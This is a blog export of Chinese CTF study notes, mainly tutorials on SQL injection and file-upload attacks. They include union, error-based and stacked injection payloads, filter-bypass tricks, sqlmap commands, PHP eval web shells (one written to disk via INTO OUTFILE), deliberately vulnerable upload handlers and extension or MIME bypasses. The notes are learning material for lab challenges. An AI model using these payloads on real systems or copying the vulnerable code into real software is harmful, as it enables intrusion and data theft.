type=str)aap.add_argument(&#x27;-t&#x27;, &#x27;--type&#x27;, choices=[&#x27;de&#x27;,&#x27;en&#x27;])aap.add_argument(&#x27;-o&#x27;, &#x27;--other&#x27;, default=&#x27;str&#x27;, choices=[&#x27;str&#x27;, &#x27;hex&#x27;])parse_argument = aap.parse_args() if parse_argument.input != None: print(parse_argument.input) print(parse_argument.type) print(parse_argument.other) else: print(&quot;*** User Help Info ***&quot;) 12345python test.py -i asdfvbngfds -t de# asdfvbngfds# de# str 大概也能看懂 session1234567891011121314151617from flask import Flask,sessionapp = Flask(__name__)app.secret_key = &quot;St3ong_s3cre4_ke7&quot;@app.route(&#x27;/&#x27;)def set_session(): if &#x27;name&#x27; in session: name = session[&#x27;name&#x27;] if name != None: return else: return &quot;你是谁&quot; else: session[&#x27;name&#x27;]=&quot;XiLitter&quot; return &quot;session重新设置&quot; if __name__ == &#x27;__main__&#x27;: app.run(debug=False,port=8000) session伪造 相同的 内容 session也不一样","categories":[{"name":"Code","slug":"Code","permalink":"http://example.com/categories/Code/"}],"tags":[{"name":"python","slug":"python","permalink":"http://example.com/tags/python/"},{"name":"web","slug":"web","permalink":"http://example.com/tags/web/"},{"name":"ssti","slug":"ssti","permalink":"http://example.com/tags/ssti/"},{"name":"flask","slug":"flask","permalink":"http://example.com/tags/flask/"}],"author":"arkcimi"},{"title":"kali","slug":"kali","date":"2023-12-06T15:37:37.000Z","updated":"2024-02-28T02:06:33.494Z","comments":true,"path":"kali/","link":"","permalink":"http://example.com/kali/","excerpt":"","text":"Kali Linux 配置换源1sudo vim /etc/apt/sources.list 加上 源 123456中科大源deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contribdeb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib清华大学源deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-freedeb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free 更新源 1sudo apt update 更新软件 1sudo apt upgrade 浏览器Chrome1wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb 1sudo dpkg -i google-chrome* 1sudo apt-get -f install 由于kali默认是root用户 chrome需要以no sandbox模式打开 打开 &#x2F;usr&#x2F;share&#x2F;applications&#x2F;google-chrome.desktop 1/usr/bin/google-chrome-stable --no-sandbox %U AppearanceThemeMc-OS CTLina XFCE 1tar xf ./MC...... /usr/share/themes/ CursorBreezeX Cursor 1tar -zxvf ./BreezeX-Dark.tar.gz 1/usr/share/icons/ icon 1tar xf ./Mk...... /usr/share/icons/ docker","categories":[{"name":"CTF","slug":"CTF","permalink":"http://example.com/categories/CTF/"}],"tags":[{"name":"linux","slug":"linux","permalink":"http://example.com/tags/linux/"}],"author":"arkcimi"},{"title":"SQL注入","slug":"SQL注入","date":"2023-11-28T13:14:43.000Z","updated":"2024-05-03T07:33:22.253Z","comments":true,"path":"SQL注入/","link":"","permalink":"http://example.com/SQL%E6%B3%A8%E5%85%A5/","excerpt":"","text":"SQL注入structure$$database_1 \\begin{cases} table_1 \\begin{bmatrix} column_1 &amp; column_2 &amp; column_3 &amp; \\cdots \\ content_{11} &amp; content_{12} &amp; content_{13} &amp; \\cdots \\ content_{21} &amp; content_{22} &amp; content_{23} &amp; \\cdots \\ content_{31} &amp; content_{32} &amp; content_{33} &amp; \\cdots \\ \\end{bmatrix} \\ table_2 \\begin{bmatrix} column_1 &amp; column_2 &amp; column_3 &amp; \\cdots \\ content_{11} &amp; content_{12} &amp; content_{13} &amp; \\cdots \\ content_{21} &amp; content_{22} &amp; content_{23} &amp; \\cdots \\ content_{31} &amp; content_{32} &amp; content_{33} &amp; \\cdots \\ \\end{bmatrix} \\\\end{cases}$$ SQL语句SELECTSELECT 列名称 FROM 表名称; SELECT * FROM 表名称; (所有列) DISTINCT去除重复值 WHEREWHERE 后接判断表达式 operator mean tips &#x3D; 等于 &lt;&gt; 不等于 &gt; 大于 &lt; 小于 &gt;&#x3D; 大于等于 &lt;&#x3D; 小于等于 BETWEEN…AND 在某个范围内 include LEFT, exclude RIGHT LIKE 搜索某种模式 %代替任意字符 IN 等于其中一种 COLUMN IN (‘VALUE1’, ‘VALUE2’…) AND and OR or ORDER BYORDER BY 列名 (ASC&#x2F;DESC) 默认排序为 ASC 升序，DESC 代表降序 UNIONSELECT … UNION SELECT … ; AS为列名称和表名称指定别名 (AS 可以省略) default: 第n列默认为n SQL常用格式1234SELECT DISTINCT &lt;columnName&gt; ((AS) &quot;columnAlias&quot;)FROM (&lt;databaseName&gt;.)&lt;tableName&gt; ((AS) &quot;tableAlias&quot;)WHERE &lt;where_condition&gt;ORDER BY &lt;order_by_list&gt; None1SELECT 1,2 原样输出 121=&gt;12=&gt;2 information_schema在MySQL中，把 information_schema 看作是一个 database(数据库) SCHEMATA表：提供了当前mysql实例中所有数据库的信息。是show databases的结果取之此表。 TABLES表：提供了关于数据库中的表的信息（包括视图）。详细表述了某个表属于哪个schema，表类型，表引擎，创建时间等信息。是show tables from schemaname的结果取之此表。 COLUMNS表：提供了表中的列信息。详细表述了某张表的所有列以及每个列的信息。是show columns from schemaname.tablename的结果取之此表。等等 1234567select database() select group_concat(table_name) from information_schema.tables where table_schema=&#x27;databaseName&#x27;select group_concat(column_name) from information_schema.columns where table_name=&#x27;tableName&#x27;select content_1 from &#x27;columnName&#x27; Sqlmap在命令行输入 1sqlmap -u http://**/?id=1 --batch &#x2F;&#x2F;batch 是默认模式 fetch database name1sqlmap -u http://**/?id=1 --dbs 1234567[time] [INFO] fetching database namesavailable databases [5]:[*] aaAA[*] information_schema[*] mysql[*] performance_schema[*] testsql_80_953 fetch table name1sqlmap -u http://**/?id=1 -D testsql_80_953 --tables 123456[time] [INFO] fetching tables for database: &#x27;testsql_80_953&#x27;Database: testsql_80_953[1 table]+-------+| users |+-------+ fetch column name1sqlmap -u http://**/?id=1 -D testsql_80_953 -T users --columns 1234567891011[time] [INFO] fetching columns for table &#x27;users&#x27; in database &#x27;testsql_80_953&#x27;Database: testsql_80_953Table: users[3 columns]+----------+-------------+| Column | Type |+----------+-------------+| id | int(3) || PASSWORD | varchar(60) || username | varchar(20) |+----------+-------------+ fetch details1sqlmap -u http://**/?id=1 -D testsql_80_953 -D testsql_80_953 -T users -C id,username --dump 123456789101112131415[time] [INFO] fetching entries of column(s) &#x27;id,username&#x27; for table &#x27;users&#x27; in database &#x27;testsql_80_953&#x27;Database: testsql_80_953Table: users[7 entries]+----+----------+| id | username |+----+----------+| 1 | AA || 2 | BB || 3 | CC || 4 | DD || 5 | EE || 6 | FF || 7 | GG |+----+----------+ 实例get传参123456789101112131415161718&lt;?php $link = mysqli_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;,&quot;testsql_80_953&quot;,3306); //location, username, password, name, port; 链接数据库 $id = $_GET[&#x27;id&#x27;]; //将传上来的id赋值给$id变量 //$query=&#x27;select * from users where id =&#x27;.$id.&#x27;;&#x27;; $query=&quot;select * from mystr where id =&#x27;&quot;.$id.&quot;&#x27;;&quot;; $result=mysqli_query($link, $query); //传入请求 while($data=mysqli_fetch_row($result)) &#123; var_dump($data); //输出 &#125; mysqli_close($link); //关闭数据库?&gt; 配置数据库 12345678910111213141516CREATE TABLE users ( id int(3) NOT NULL AUTO_INCREMENT, username varchar(20) NOT NULL, password varchar(60) NOT NULL, PRIMARY KEY (id) );INSERT INTO users (id, username, password) VALUES (&#x27;1&#x27;, &#x27;AA&#x27;, &#x27;aa&#x27;), (&#x27;2&#x27;, &#x27;BB&#x27;, &#x27;bb&#x27;), (&#x27;3&#x27;, &#x27;CC&#x27;, &#x27;cc&#x27;), (&#x27;4&#x27;, &#x27;DD&#x27;, &#x27;dd&#x27;), (&#x27;5&#x27;, &#x27;EE&#x27;, &#x27;ee&#x27;), (&#x27;6&#x27;, &#x27;FF&#x27;, &#x27;ff&#x27;), (&#x27;7&#x27;, &#x27;GG&#x27;, &#x27;gg&#x27;); 然后就能在 phpMyAdmin 中看见以下表格 id username PASSWORD 1 AA aa 2 BB bb 3 CC cc 4 DD dd 5 EE ee 6 FF ff 7 GG gg 我们在url输入 &#x2F;?id&#x3D;1 回显 array(3) { [0]&#x3D;&gt; string(1) “1” [1]&#x3D;&gt; string(2) “AA” [2]&#x3D;&gt; string(2) “aa” } 改成 $query&#x3D;”SELECT * from users where username&#x3D;$id”; 输入 &#x2F;?id&#x3D;”AA” 得到 12345array(3) &#123; [&quot;id&quot;]=&gt; string(1) &quot;1&quot; [&quot;username&quot;]=&gt; string(2) &quot;AA&quot; [&quot;PASSWORD&quot;]=&gt; string(2) &quot;aa&quot; &#125; 输入 &#x2F;?id&#x3D;”AA” union select * from users where username&#x3D;”BB” 得到 12345678910array(3) &#123; [&quot;id&quot;]=&gt; string(1) &quot;1&quot; [&quot;username&quot;]=&gt; string(2) &quot;AA&quot; [&quot;PASSWORD&quot;]=&gt; string(2) &quot;aa&quot; &#125; array(3) &#123; [&quot;id&quot;]=&gt; string(1) &quot;2&quot; [&quot;username&quot;]=&gt; string(2) &quot;BB&quot; [&quot;PASSWORD&quot;]=&gt; string(2) &quot;bb&quot; &#125; 输入 &#x2F;?id&#x3D;”AA” union select 1,2 这个时候会报错, 因为列的数量不同, 无法组成一个表格 输入 &#x2F;?id&#x3D;”AA” union select 1,2,3 12345678910array(3) &#123; [0]=&gt; string(1) &quot;1&quot; [1]=&gt; string(2) &quot;AA&quot; [2]=&gt; string(2) &quot;aa&quot; &#125; array(3) &#123; [0]=&gt; string(1) &quot;1&quot; [1]=&gt; string(1) &quot;2&quot; [2]=&gt; string(1) &quot;3&quot; &#125; 改成 $query&#x3D;’select * from users where id &#x3D;’.$id.’ limit 0,1’; 输入 &#x2F;?id&#x3D;1 array(3) &#123; [0]=&gt; string(1) &quot;1&quot; [1]=&gt; string(2) &quot;AA&quot; [2]=&gt; string(2) &quot;aa&quot; &#125; 输入 &#x2F;?id&#x3D;1 or 1&#x3D;1 输出不变 因为 limit 0 , 1 意为 从第 0 条开始, 输出 1 条 输入 ?id&#x3D;1%20or%201&#x3D;1%23 | ?id&#x3D;1%20or%201&#x3D;1–+ 1234567array(3) &#123; [0]=&gt; string(1) &quot;1&quot; [1]=&gt; string(2) &quot;AA&quot; [2]=&gt; string(2) &quot;aa&quot; &#125;array(3) &#123; [0]=&gt; string(1) &quot;2&quot; [1]=&gt; string(2) &quot;BB&quot; [2]=&gt; string(2) &quot;bb&quot; &#125;array(3) &#123; [0]=&gt; string(1) &quot;3&quot; [1]=&gt; string(2) &quot;CC&quot; [2]=&gt; string(2) &quot;cc&quot; &#125;array(3) &#123; [0]=&gt; string(1) &quot;4&quot; [1]=&gt; string(2) &quot;DD&quot; [2]=&gt; string(2) &quot;dd&quot; &#125;array(3) &#123; [0]=&gt; string(1) &quot;5&quot; [1]=&gt; string(2) &quot;EE&quot; [2]=&gt; string(2) &quot;ee&quot; &#125;array(3) &#123; [0]=&gt; string(1) &quot;6&quot; [1]=&gt; string(2) &quot;FF&quot; [2]=&gt; string(2) &quot;ff&quot; &#125;array(3) &#123; [0]=&gt; string(1) &quot;7&quot; [1]=&gt; string(2) &quot;GG&quot; [2]=&gt; string(2) &quot;gg&quot; &#125; 这个时候就能全部输出了 实战T1 堆叠注入就一个输入框 1’ or 1&#x3D;1;# 全部输出(使WHERE后的条件为true) 1234567891011121314array(2) &#123; [0]=&gt;string(1) &quot;1&quot; [1]=&gt;string(7) &quot;hahahah&quot;&#125;array(2) &#123; [0]=&gt;string(1) &quot;2&quot; [1]=&gt;string(12) &quot;miaomiaomiao&quot;&#125;array(2) &#123; [0]=&gt;string(6) &quot;114514&quot; [1]=&gt;string(2) &quot;ys&quot;&#125; 1’ union select 1,2; 1return preg_match(&quot;/select|update|delete|drop|insert|where|\\./i&quot;,$inject); 可见是有正则过滤的 1’;show databases; 12345678910111213141516171819202122232425262728array(2) &#123; [0]=&gt;string(1) &quot;1&quot; [1]=&gt;string(7) &quot;hahahah&quot;&#125;----------------------------array(1) &#123; [0]=&gt;string(11) &quot;ctftraining&quot;&#125;array(1) &#123; [0]=&gt;string(18) &quot;information_schema&quot;&#125;array(1) &#123; [0]=&gt;string(5) &quot;mysql&quot;&#125;array(1) &#123; [0]=&gt;string(18) &quot;performance_schema&quot;&#125;array(1) &#123; [0]=&gt;string(9) &quot;supersqli&quot;&#125;array(1) &#123; [0]=&gt;string(4) &quot;test&quot;&#125; 用同样的方法查看表名 1’;show tables; 1234567array(1) &#123; [0]=&gt;string(16) &quot;1919810931114514&quot;&#125;array(1) &#123; [0]=&gt;string(5) &quot;words&quot;&#125; 查看所有列 1’;show columns from “1919810931114514”; 此时没有显示, 要加#注释后面的 1’;show columns from “1919810931114514”;# 12345678array(6) &#123; [0]=&gt;string(4) &quot;flag&quot; [1]=&gt;string(12) &quot;varchar(100)&quot; [2]=&gt;string(2) &quot;NO&quot; [3]=&gt;string(0) &quot;&quot; [4]=&gt;NULL [5]=&gt;string(0) &quot;&quot;&#125; 1’;show columns from words;# (字符可以不用””) 1234567891011121314151617array(6) &#123; [0]=&gt;string(2) &quot;id&quot; [1]=&gt;string(7) &quot;int(10)&quot; [2]=&gt;string(2) &quot;NO&quot; [3]=&gt;string(0) &quot;&quot; [4]=&gt;NULL [5]=&gt;string(0) &quot;&quot;&#125;array(6) &#123; [0]=&gt;string(4) &quot;data&quot; [1]=&gt;string(11) &quot;varchar(20)&quot; [2]=&gt;string(2) &quot;NO&quot; [3]=&gt;string(0) &quot;&quot; [4]=&gt;NULL [5]=&gt;string(0) &quot;&quot;&#125; 因此得出, 表”1919810931114514”只有一个(varchar)变量flag, 表words有(int)id, (varchar)data. 而且, 一直输入的 1’ 就是words中的一列 结合全部输出结果, 推出words id data 1 hahahah 2 miaomiaomiao 114514 ys 那么原语句应该是 SELECT * FROM words WHERE id &#x3D;( ) 使用十六进制编码绕过 select * from `1919810931114514` -&gt; 0x73656C656374202A2066726F6D20603139313938313039333131313435313460 1234&#x27;1&#x27;;set @sql = 0x73656C656374202A2066726F6D20603139313938313039333131313435313460;PREPARE hacker from @sql;EXecute hacker; handler 1234&#x27;1&#x27;;handler &#x27;1919810931114514&#x27; open;handler &#x27;1919810931114514&#x27; read first;handler &#x27;1919810931114514&#x27; close; 重命名 1234&#x27;1&#x27;;rename tables `words` to `words1`;rename tables `1919810931114514` to `words`; alter table `words` change `flag` `id` varchar(100);# 然后再输入 1’ or 1&#x3D;1;# 1234array(1) &#123;[0]=&gt;string(38) &quot;flag&#123;c168d583ed0d4d7196967b28cbd0b5e9&#125;&quot;&#125; T2 union&#x2F;group_concat() &#x2F;?wllm&#x3D;1 12Your Login name:xxxYour Password:yyy 有回显 &#x2F;?wllm&#x3D;1’ order by 3 –+ &#x2F;?wllm&#x3D;1’ order by 4 –+ 第一个回显正常, 第二个回显 1Unknown column &#x27;4&#x27; in &#x27;order clause&#x27; 可以知道一共有3列 &#x2F;?wllm&#x3D;-1’ union select 1,2,3 –+ 12Your Login name:2Your Password:3 可以看出回显的是2,3列 (-1 是让前面的select无结果) &#x2F;?wllm&#x3D;-1’ union select 1,2,database() –+ 得到数据库名字 test_db &#x2F;?wllm&#x3D;-1’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;’test_db’–+ 得到表名 test_tb,users &#x2F;?wllm&#x3D;-1’ union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;’test_tb’–+ 得到列名 id,flag &#x2F;?wllm&#x3D;-1’ union select 1,2,flag from test_tb –+ 查询 test_db 表读取flag T3 绕过&#x2F;substr()同T2 但是多了 空格, #, &#x3D; 绕过 #绕过 %23 1/?wllm=-1%27%09union%09select%091,2,group_concat(table_name)%09from%09information_schema.tables%09where%09table_schema=&#x27;test_db&#x27;%23 &#x3D;用 like 绕过 1/?wllm=-1%27%09union%09select%091,2,group_concat(table_name)%09from%09information_schema.tables%09where%09table_schema%09like%09&#x27;test_db&#x27;%23 1/?wllm=-1%27%09union%09select%091,2,group_concat(column_name)%09from%09information_schema.columns%09where%09table_name%09like%09&#x27;LTLT_flag&#x27;%23 得到column名 flag 方法1 1/?wllm=-1&#x27;%09union%09select%091,2,flag%09from%09LTLT_flag 得到NSSCTF{3488f97c-13e0 明显长度不够 分别把 flag 替换为 mid(flag, 1, 20), mid(flag, 15, 20), mid(flag, 20, 20), mid(flag, 40, 20) 拼凑出flag: NSSCTF{3488f97c-13e0-4198-8e17-5106582987bf} 方法2 1?wllm=-1&#x27;union%09select%091,2,group_concat(flag)%09from%09test_db.LTLT_flag%23 T4回显 1You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#x27;*&#x27; LIMIT 0,1&#x27; at line 1 说明 空格, union, or 会被消除 用 -1&#39;/**/ununionion/**/select/**/1,2,3;#绕过 (limit 1,1 显示第二条信息) 1-1&#x27;/**/ununionion/**/select/**/1,2,group_concat(table_name)/**/from/**/infoorrmation_schema.tables/**/where/**/table_schema=&#x27;NSS_db&#x27;/**/limit/**/1,1%23 1-1&#x27;/**/ununionion/**/select/**/1,2,group_concat(column_name)/**/from/**/infoorrmation_schema.columns/**/where/**/table_name=&#x27;NSS_tb&#x27;/**/limit/**/1,1%23 1-1&#x27;/**/ununionion/**/select/**/1,2,Secr3t/**/from/**/NSS_tb/**/limit/**/1,1%23 得到flag T5 布尔盲注先输常见数字123451,2query_success0,3,4...query_error general布尔盲注的几种方法 12?id=if((), 1, 0) ==&gt; true=1; flase=0?id=1 and () database爆database_name 1substr(database(),i,1) = j table爆 table 的数量 1(select COUNT(*) from information_schema.tables where table_schema=database()) = i 爆 table 的 name limit i, 1第i+1张表 123length(select table_name from information_schema.tables where table_schema=database() limit k,1)= isubstr((select table_name from information_schema.tables where table_schema=database() limit k,1),i,1) = j column爆 column 的数量 1select COUNT(*) from information_schema.columns where table_schema=database() and table_name=&#x27;table_name&#x27; = i 爆 column 的 name 123length(select columns from information_schema.columns where table_schema=database() and table_name=&#x27;table_name&#x27; limit k,1)=isubstr((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;table_name&#x27; limit k,1),i,1)=j content1substr((select column_name from database_name.table_name),i,1) = j T61select database() 1select schema_name from information_schema.schemata 两种方法得到的数据库数量不一样…… T7 报错注入 updatexml() | extractvalue() 函数, 当第二个参数包含特殊符号时会报错, 并将第二个参数的内容显示在报错信息中 ( 0x7e 是 ~ 的十六进制) 我们输入 ?id=1&#39; and updatexml(1, 0x7e, 3) ?id=1&#39; and extractvalue(1, 0x7e) 参数2包含特殊符号 ~, 触发数据库报错, 并将参数2的内容显示在报错信息中 将查询语句和特殊符号拼接( concat() )在一起, 就可以将查询结果显示在报错信息中 1updatexml(1, concat(0x7e, select group_concat(schema_name) from information_schema.schemata), 3) updatexml() 函数的报错内容长度不能超过32个字符, 常用的解决方式有两种： limit 分页 substr()截取字符 -1&#39; and extractvalue(1, &#39;~&#39;)# 回显 XPATH syntax error: &#39;~&#39; -1&#39;and(select extractvalue(1,concat(&#39;~&#39;,(select database()))))# (select 语句要加括号) 回显 ~test_db -1&#39; and extractvalue(1, concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema=&#39;test_db&#39;)))# (‘’) 回显~test_tb,users -1&#39;and extractvalue(1,concat(&#39;~&#39;,(select group_concat(column_name) from information_schema.columns where table_name=&quot;test_tb&quot; and table_schema=&#39;test_db&#39;))))# 回显~id,flag -1&#39;and(select extractvalue(1,concat(&#39;~&#39;,(select substr((select flag from test_tb), 1 , 30)))))# -1&#39;and(select extractvalue(1,concat(&#39;~&#39;,(select substr((select flag from test_tb), 31 , 60)))))# 12345678 NSSCTF&#123;b76ff8ed-7b52-47b1-bdfa-b6212fa80607&#125;### md5 ffifdoyp =&gt; &#x27;&#x27;or乱码## 常见绕过### 大小写 UNION SELECT=&gt;uNIon SElecT 12### 编码 union select=&gt;%75%6e%6f%69%6e %73%65%6c%65%63%74 1### 函数 mysql：union select=&gt;&#39;uni&#39;+&#39;on&#39; &#39;sele&#39;+&#39;ct&#39; orcale：union select&#x3D;&gt;’uni’||’on’ ‘sel’||ect’’ select&#x3D;&gt;cha(83)||cha(69)||cha(76)||cha(69)||cha(67)||cha(84) MS_SQL：union select&#x3D;&gt;’uni’’on’ ‘sele’’ct’ select&#x3D;&gt;char(83)+char(69)+char(76)+char(69)+char(67)+char(84) 12### 注释(空格) union select&#x3D;&gt;&#x2F;&#x2F;UNION&#x2F;&#x2F;SELECT&#x2F;**&#x2F; 12### 双写 union select&#x3D;&gt;uniunionon seselectlect 16、使用空字节 union select&#x3D;&gt;%00 union select 123456C/C++，在C/C++中空字节代表语句的结束## 生成文件```sqlselect &#x27;&lt;?php eval($_POST[hack]); ?&gt;&#x27; INTO OUTFILE &#x27;/var/www/html/test.php&#x27;;","categories":[{"name":"CTF","slug":"CTF","permalink":"http://example.com/categories/CTF/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://example.com/tags/ctf/"},{"name":"文件注入","slug":"文件注入","permalink":"http://example.com/tags/%E6%96%87%E4%BB%B6%E6%B3%A8%E5%85%A5/"}],"author":"arkcimi"},{"title":"文件注入","slug":"文件注入","date":"2023-11-16T15:45:42.000Z","updated":"2023-12-30T11:54:40.000Z","comments":true,"path":"文件注入/","link":"","permalink":"http://example.com/%E6%96%87%E4%BB%B6%E6%B3%A8%E5%85%A5/","excerpt":"","text":"文件注入原理用 phpstudy 创建一个网站 index.html12345678910&lt;html&gt; &lt;body&gt; &lt;form action=&quot;upload_file.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;label for=&quot;file&quot;&gt;filename:&lt;/label&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot; /&gt; &lt;br /&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;submit&quot; /&gt; &lt;/form&gt; &lt;/body&gt;&lt;/html&gt; upload_file.php这个文件的名字应该跟 index.html 中的 action 一样 12345678910111213141516171819202122232425&lt;?php if ($_SERVER[&#x27;REQUEST_METHOD&#x27;] === &#x27;POST&#x27;) &#123; if ($_FILES[&#x27;file&#x27;][&#x27;error&#x27;] === UPLOAD_ERR_OK) // 检查是否有文件上传错误 &#123; // 获取上传文件的信息 $fileName = $_FILES[&#x27;file&#x27;][&#x27;name&#x27;]; $fileType = $_FILES[&#x27;file&#x27;][&#x27;type&#x27;]; $fileSize = $_FILES[&#x27;file&#x27;][&#x27;size&#x27;]; $tmpFileName = $_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;]; // 将文件从临时位置移动到目标位置 $destination = &#x27;uploads/&#x27; . $fileName; move_uploaded_file($tmpFileName, $destination); echo (&quot;$destination&quot;); echo &#x27; upload finish!&#x27;; &#125; else &#123; echo &#x27;fail: &#x27; . $_FILES[&#x27;file&#x27;][&#x27;error&#x27;]; &#125; &#125;?&gt; 上传文件按照提示上传文件后 便可以在 uploads&#x2F;文件名 中打开 一句话木马in.php 1&lt;?php @eval($_POST[&#x27;cmd&#x27;]); ?&gt; //@防止报错 把该文件传入后 在url处输入 1/uploads/in.php 使用POST传参 1cmd=phpinfo(); 然后可以看到 这个命令成功执行 这个时候就可以用蚁剑连接 文件类型 检测upload_file.php 123456789101112131415161718192021222324252627282930&lt;?php if ($_SERVER[&#x27;REQUEST_METHOD&#x27;] === &#x27;POST&#x27;) &#123; if ($_FILES[&#x27;file&#x27;][&#x27;error&#x27;] === UPLOAD_ERR_OK) // 检查是否有文件上传错误 &#123; // 获取上传文件的信息 $fileName = $_FILES[&#x27;file&#x27;][&#x27;name&#x27;]; $fileType = $_FILES[&#x27;file&#x27;][&#x27;type&#x27;]; //文件类型 $fileSize = $_FILES[&#x27;file&#x27;][&#x27;size&#x27;]; if($fileType == &quot;image/jpg&quot; || $fileType == &quot;image/png&quot;) //文件类型/MIME类型 &#123; $tmpFileName = $_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;]; $destination = &#x27;uploads/&#x27; . $fileName; move_uploaded_file($tmpFileName, $destination); echo (&quot;$destination&quot;); echo &#x27; upload finish!&#x27;; &#125; else &#123; echo &#x27;FileType error. only jpg or png is accepted&#x27;; &#125; &#125; else &#123; echo &#x27;fail: &#x27; . $_FILES[&#x27;file&#x27;][&#x27;error&#x27;]; &#125; &#125;?&gt; 这个时候再传入in.php就会报错 用BurpSuite把 Content-Type: application/x-php 改成 Content-Type: image/jpg 可以看到 上传成功了 MIME类型 (Multipurpose Internet Mail Extensions) 后缀 MIME类型 .html text&#x2F;html .txt text&#x2F;plain .php application&#x2F;octer-stream .pdf application&#x2F;pdf .word application&#x2F;msword .gz application&#x2F;x-gzip .zip application&#x2F;x-zip-compressed .png image&#x2F;png .gif image&#x2F;gif .jpeg,.jpg image&#x2F;jpeg .au audio&#x2F;basic .mpg,.mpeg video&#x2F;mpeg .avi video&#x2F;x-msvideo 文件后缀名 检测 (白名单)1234567891011121314151617181920212223242526272829303132&lt;?php if ($_SERVER[&#x27;REQUEST_METHOD&#x27;] === &#x27;POST&#x27;) &#123; if ($_FILES[&#x27;file&#x27;][&#x27;error&#x27;] === UPLOAD_ERR_OK) // 检查是否有文件上传错误 &#123; // 获取上传文件的信息 $fileName = $_FILES[&#x27;file&#x27;][&#x27;name&#x27;]; $fileType = $_FILES[&#x27;file&#x27;][&#x27;type&#x27;]; $fileSize = $_FILES[&#x27;file&#x27;][&#x27;size&#x27;]; $fileExt = substr($fileName, strrpos($fileName, &#x27;.&#x27;) + 1); //文件后缀名 if(strtolower($fileExt) == &quot;jpg&quot; || strtolower($fileExt) == &quot;jpeg&quot; || strtolower($fileExt) == &quot;png&quot;) //文件后缀名 &#123; $tmpFileName = $_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;]; $destination = &#x27;uploads/&#x27; . $fileName; move_uploaded_file($tmpFileName, $destination); echo (&quot;$destination&quot;); echo &#x27; upload finish!&#x27;; &#125; else &#123; echo &#x27;FileExtension error. only jpg, jpeg or png is accepted&#x27;; &#125; &#125; else &#123; echo &#x27;fail: &#x27; . $_FILES[&#x27;file&#x27;][&#x27;error&#x27;]; &#125; &#125;?&gt; 还是在BurpSuite中 先把 in.php 重命名为 in.php .jpg 选择Hex 69 6e 2e 70 68 70 20 2e 6a 70 67 改为 69 6e 2e 70 68 70 00 2e 6a 70 67 i n . p h p . j p g 改为 i n . p h p . j p g 20为空格 文件后缀名 检测 (黑名单)1234567891011121314151617181920212223242526272829303132&lt;?php if ($_SERVER[&#x27;REQUEST_METHOD&#x27;] === &#x27;POST&#x27;) &#123; if ($_FILES[&#x27;file&#x27;][&#x27;error&#x27;] === UPLOAD_ERR_OK) // 检查是否有文件上传错误 &#123; // 获取上传文件的信息 $fileName = $_FILES[&#x27;file&#x27;][&#x27;name&#x27;]; $fileType = $_FILES[&#x27;file&#x27;][&#x27;type&#x27;]; $fileSize = $_FILES[&#x27;file&#x27;][&#x27;size&#x27;]; $fileExt = substr($fileName, strrpos($fileName, &#x27;.&#x27;) + 1); //文件后缀名 if(strtolower($fileExt) != &quot;php&quot;) //文件后缀名 &#123; $tmpFileName = $_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;]; $destination = &#x27;uploads/&#x27; . $fileName; move_uploaded_file($tmpFileName, $destination); echo (&quot;$destination&quot;); echo &#x27; upload finish!&#x27;; &#125; else &#123; echo &#x27;FileExtension error. php is not accepted.&#x27;; &#125; &#125; else &#123; echo &#x27;fail: &#x27; . $_FILES[&#x27;file&#x27;][&#x27;error&#x27;]; &#125; &#125;?&gt; 绕过方法 大小写绕过 in.PHP 空格绕过 in.php (Windows服务器会自动去掉空格) 点绕过 in.php./in.php. .(程序可能会删除点) 双写绕过 in.pphphp(程序把php替换为空, 但只执行一次) .htaccess 文件绕过 123&lt;FilesMatch &quot;jpg&quot;&gt; SetHandler application/x-httpd-php &lt;/FilesMatch&gt; 这个文件的意思是把 jpg 文件当成 php 执行 然后把 in.php 重命名为 in.jpg 12└─# ls -a ./ . .. .htaccess in.Php in.jpg &#x27;in.p hp&#x27; &#x27;in.php &#x27; in.php. &#x27;in.php::$DATA&#x27; (我传进去了但打不开…)&#x2F;&#x2F;405 Not Allowed 文件内容 检测通过检测文件内容来判断上传文件的类型是否合法 文件幻数 文件类型 文件头 文件尾 JPG FFD8DD GIF GIF89a 以gif为例, 在文件头加入 GIF89a T1index.php 1234567891011121314&lt;?phpsession_start();echo &quot;&lt;meta charset=\\&quot;utf-8\\&quot;&gt;&lt;title&gt;下手轻点，求求了&lt;/title&gt;&lt;form action=\\&quot;upload.php\\&quot; method=\\&quot;post\\&quot; enctype=\\&quot;multipart/form-data\\&quot;&gt;&lt;input type=\\&quot;file\\&quot; name=\\&quot;uploaded\\&quot; /&gt;&lt;br/&gt;&lt;input type=\\&quot;submit\\&quot; name=\\&quot;submit\\&quot; value=\\&quot;感觉要被秒了\\&quot; /&gt;&lt;/form&gt;&quot;;if(!isset($_SESSION[&#x27;user&#x27;]))&#123; $_SESSION[&#x27;user&#x27;] = md5((string)time() . (string)rand(100, 1000));&#125;?&gt; upload.php 1234567891011121314151617181920212223242526272829303132&lt;?phpsession_start();echo &quot;&lt;meta charset=\\&quot;utf-8\\&quot;&gt;&quot;;if(!isset($_SESSION[&#x27;user&#x27;]))&#123; $_SESSION[&#x27;user&#x27;] = md5((string)time() . (string)rand(100, 1000));&#125;if(isset($_FILES[&#x27;uploaded&#x27;])) &#123; $target_path = &quot;./upload&quot;; $t_path = $target_path . &quot;/&quot; . basename($_FILES[&#x27;uploaded&#x27;][&#x27;name&#x27;]); $uploaded_name = $_FILES[&#x27;uploaded&#x27;][&#x27;name&#x27;]; $uploaded_ext = substr($uploaded_name, 